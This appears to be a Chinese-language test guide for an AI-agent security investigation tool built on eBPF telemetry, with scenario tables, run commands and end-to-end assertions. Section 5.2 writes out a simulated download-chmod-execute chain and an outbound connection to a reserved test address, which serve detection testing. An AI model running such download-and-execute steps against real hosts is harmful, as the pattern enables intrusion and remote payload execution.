# AI Agent 场景与真实 eBPF 端到端测试

## 1. 测试目标

本测试体系分别验证三件事：

1. Agent 编排正确：Planner 生成合法任务图，Executor 只能调用任务白名单工具，Analyzer 只能引用已登记证据。
2. 安全事件链正确：事件经过处理、行为规则、Incident 关联后生成告警。
3. Linux 采集链正确：真实 eBPF Hook 将进程、文件、权限和网络事件写入 RingBuffer，Collector 经过 CEL 判断和上报后触发调查。

三层测试不能互相替代。Windows 可以完成前两层中的离线逻辑验证；真实 eBPF 加载、Verifier 和 RingBuffer 只能在 Linux 主机验证。

## 2. 内置场景

| ID | 场景 | 预期 |
| --- | --- | --- |
| `web-rce` | Web入口、Shell、下载、落地、执行、外联 | `SUSPICIOUS/COMPLETED` |
| `ssh-takeover` | SSH失败与成功、sudo、SSH key、Cron、外联 | `SUSPICIOUS/COMPLETED` |
| `container-escape` | 临时程序、setns、mount、chroot | `SUSPICIOUS/COMPLETED` |
| `k8s-service-account` | API连接、读取资源、创建特权DaemonSet | `SUSPICIOUS/COMPLETED` |
| `fileless-injection` | memfd样式执行、ptrace、目标进程外联 | `SUSPICIOUS/COMPLETED` |
| `credential-exfiltration` | 凭据搜索、临时归档、DNS、疑似外传 | `SUSPICIOUS/COMPLETED` |
| `normal-operations` | 已批准运维，无提权和外联 | `INCONCLUSIVE/NEEDS_REVIEW` |
| `degraded-telemetry` | 数据源首次失败、遥测不完整 | `INCONCLUSIVE/NEEDS_REVIEW` |

Agent 初始只获得种子告警。其他事件保存在场景工具适配器后面，必须通过工具调用获取。每个场景检查：

- 计划是否合法；
- 必需工具是否真正调用；
- 必需源事件是否形成 Evidence；
- 最终分类和运行状态是否符合标准答案；
- 工具参数、返回、重试和任务状态是否进入逐行审计日志。

## 3. 离线确定性回归

列出场景：

```bash
go run ./cmd/agent-scenario -list
```

运行全部场景：

```bash
go run ./cmd/agent-scenario \
  -scenario all \
  -mode deterministic \
  -audit .artifacts/scenario-audit.jsonl
```

运行单个或多个场景：

```bash
go run ./cmd/agent-scenario -scenario web-rce,container-escape
```

确定性模式使用固定 Planner/Executor/Analyzer，但仍经过真实 Controller、参数验证、Tool Gateway、Scope、预算、证据生成和报告校验。它用于 CI 和回归，不用于评估模型推理质量。

预期结尾：

```text
=== SUITE END total=8 passed=8 failed=0 ===
```

## 4. Qwen 模型测试

```bash
export QWEN_API_KEY='your-key'
export QWEN_PLANNER_MODEL='qwen3.7-plus'
export QWEN_EXECUTOR_MODEL='qwen3.7-plus'
export QWEN_ANALYZER_MODEL='qwen3.7-plus'

go run ./cmd/agent-scenario \
  -scenario web-rce \
  -mode qwen \
  -timeout 3m \
  -audit .artifacts/qwen-web-rce.jsonl
```

Qwen 模式使用相同场景、工具契约和期望断言，但计划和每一步工具选择由真实模型完成。模型不能直接读取隐藏事件。

失败时优先查看这些审计事件：

```text
PLAN_REJECTED
PLAN_FALLBACK
ACTION_REPAIRED
TOOL_END
TOOL_OBSERVATION
TASK_END
RUN_END
```

## 5. 真实 eBPF 到 AI 的端到端测试

### 5.1 环境

- Ubuntu 测试主机或 VM；
- `/sys/kernel/btf/vmlinux` 可读；
- root 权限；
- Go、clang、bpftool、make、curl、python3；
- 若验证 AI 阶段，设置 `QWEN_API_KEY`。

执行：

```bash
cd /home/ubuntu/workspace/Agent-Sec
export QWEN_API_KEY='your-key'
sudo -E bash scripts/e2e_ebpf_ai_demo.sh
```

只验证 eBPF、告警和 Incident，不调用模型：

```bash
sudo -E bash scripts/e2e_ebpf_ai_demo.sh --skip-ai
```

### 5.2 信号生成器

`cmd/demo-payload` 是无破坏性的固定行为生成器。脚本将同一二进制复制为 `java` 和 `curl`，用可执行文件名模拟以下父子链：

```text
java
  └─ /bin/sh
       ├─ curl https://203.0.113.77/agent-sec-demo -o /tmp/agent-sec-demo/payload
       ├─ chmod 0755 /tmp/agent-sec-demo/payload
       └─ /tmp/agent-sec-demo/payload
            └─ connect attempt 203.0.113.77:443
```

这里的 `curl` 是本项目生成的测试程序，不是系统 curl，也不会下载内容。它只把自身复制到固定临时路径。`203.0.113.77` 属于文档保留地址 TEST-NET-3；程序仅发起最多 250ms 的连接尝试，不发送数据。

程序还有以下防护：

- 必须存在 `AGENT_SEC_DEMO=1`；
- 入口必须显式传入 `--run-safe-demo`；
- 只允许固定 URL、目标地址和输出路径；
- 临时目录必须包含程序创建的安全标记，拒绝复用任意同名目录；
- 拒绝覆盖符号链接及非普通文件；
- 不执行提权、namespace、mount、ptrace、凭据访问或漏洞利用。

### 5.3 E2E 断言

脚本依次断言：

1. Go 单元测试和 eBPF 编译通过；
2. Server 和 Collector 健康；
3. RingBuffer/Collector 捕获 `process_exec`、`file_create`、`file_chmod`、`network_connect`；
4. CEL 规则生成本地安全告警；
5. 行为层生成 `WebServerSpawnShell`、`DownloadExecutable`、`ExecuteFromTemp`、`RareExternalConnection`；
6. 关联层生成一个 Incident；
7. 脚本自动调用 `/api/agent/investigate-ai`；
8. AI 返回计划、任务结果、报告，并产生 `RUN_START`、`TOOL_OBSERVATION`、`RUN_END` 审计记录。

每次运行的证据写入：

```text
.artifacts/e2e-<UTC时间>/
├── collector.log
├── collector-metrics-before.txt
├── collector-metrics-after.txt
├── events.json
├── behaviors.json
├── alerts.json
├── incidents.json
├── ai-request.json
├── ai-result.json
└── ai-audit.jsonl
```

## 6. 当前限制

- 当前 eBPF Hook 多数位于 syscall enter，连接或文件操作事件表示“发生尝试”，还不能证明 syscall 成功。
- TEST-NET 连接尝试专门用于触发可控的网络事件，不代表真实 C2 成功。
- 本机演示没有容器元数据，因此真实 E2E Incident 位于 host scope；容器场景通过离线场景工具验证。
- Qwen 输出存在非确定性。离线确定性模式用于判断代码回归，Qwen 模式用于评估模型是否在预算内完成合理规划和证据引用。
